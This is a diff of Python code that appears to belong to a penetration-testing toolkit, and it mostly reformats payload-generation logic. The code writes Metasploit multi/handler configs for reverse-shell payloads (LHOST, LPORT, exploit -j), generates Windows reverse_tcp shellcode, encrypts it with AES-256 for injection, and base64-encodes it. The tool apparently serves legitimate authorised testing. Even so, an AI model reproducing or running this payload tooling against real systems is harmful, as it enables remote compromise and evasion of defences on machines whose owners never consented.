@@ -388,17 +388,13 @@ try:
                                 if choice9 == "6":
                                     break
 
-                                shellcode_port = raw_input(
-                                    setprompt(["4"], "Enter the port number [443]"))
-                                if shellcode_port == "":
-                                    shellcode_port = "443"
+                                shellcode_port = raw_input(setprompt(["4"], "Enter the port number [443]"))
+                                if shellcode_port == "": shellcode_port = "443"
 
                                 # here we prep our meta config to listen on all
                                 # the ports we want - free hugs all around
-                                filewrite = open(
-                                    "%s/meta_config_multipyinjector" % (setdir), "a")
-                                port_check = check_ports(
-                                    "%s/meta_config_multipyinjector" % (setdir), shellcode_port)
+                                filewrite = open("%s/meta_config_multipyinjector" % (setdir), "a")
+                                port_check = check_ports("%s/meta_config_multipyinjector" % (setdir), shellcode_port)
                                 if port_check == False:
                                     filewrite.write("use exploit/multi/handler\nset PAYLOAD %s\nset EnableStageEncoding %s\nset LHOST %s\nset LPORT %s\nset ExitOnSession false\nexploit -j\r\n\r\n" % (
                                         choice9, stage_encoding, ipaddr, shellcode_port))
@@ -438,25 +434,21 @@ try:
                                     choice9, choice2, portnum)
                             # windows shell reverse_tcp
                             if choice9 == "windows/shell/reverse_tcp":
-                                shellcode = metasploit_shellcode(
-                                    choice9, choice2, portnum)
+                                shellcode = metasploit_shellcode(choice9, choice2, portnum)
 
                             if choice1 == "shellcode/pyinject":
                                 shellcode_port = portnum.replace("LPORT=", "")
 
-                            if validate_ip(choice2) == True:
-                                shellcode = shellcode_replace(
-                                    choice2, shellcode_port, shellcode)
+                            if validate_ip(choice2) == True: 
+                                shellcode = shellcode_replace(choice2, shellcode_port, shellcode)
 
                             # here we write out the payload and port for later
                             # use in powershell injection
-                            payload_options.write(
-                                choice9 + " " + portnum + ",")
+                            payload_options.write(choice9 + " " + portnum + ",")
 
                             # break out of the loop if we are only using one
                             # payload else keep on
-                            if choice1 == "shellcode/pyinject":
-                                break
+                            if choice1 == "shellcode/pyinject": break
                             multipyinject_payload += shellcode + ","
 
                         # get rid of tail comma
@@ -464,26 +456,25 @@ try:
                             multipyinject_payload = multipyinject_payload[:-1]
 
                         # if we have multiple payloads, use multi injector
+
                         if choice1 == "shellcode/multipyinject":
+
                             # we first need to encrypt the payload via AES 256
-                            print_status(
-                                "Encrypting the shellcode via AES 256 encryption..")
+                            print_status("Encrypting the shellcode via AES 256 encryption..")
                             secret = os.urandom(32)
-                            shellcode = encryptAES(
-                                secret, multipyinject_payload)
-                            print_status(
-                                "Dynamic cipher key created and embedded into payload.")
-                        filewrite = open(
-                            "%s/meterpreter.alpha_decoded" % (setdir), "w")
+                            shellcode = encryptAES(secret, multipyinject_payload)
+                            print_status("Dynamic cipher key created and embedded into payload.")
+
+                        filewrite = open("%s/meterpreter.alpha_decoded" % (setdir), "w")
                         filewrite.write(shellcode)
                         filewrite.close()
-                    if choice1 == "shellcode/pyinject" or choice1 == "shellcode/multipyinject":
 
+                    if choice1 == "shellcode/pyinject" or choice1 == "shellcode/multipyinject":
                         # close the pyinjector file for ports and payload
                         payload_options.close()
+
                     # here we are going to encode the payload via base64
-                    fileopen = open(
-                        "%s/meterpreter.alpha_decoded" % (setdir), "r")
+                    fileopen = open("%s/meterpreter.alpha_decoded" % (setdir), "r")
                     data = fileopen.read()
                     if payloadgen != "solo":
                         # base64 1
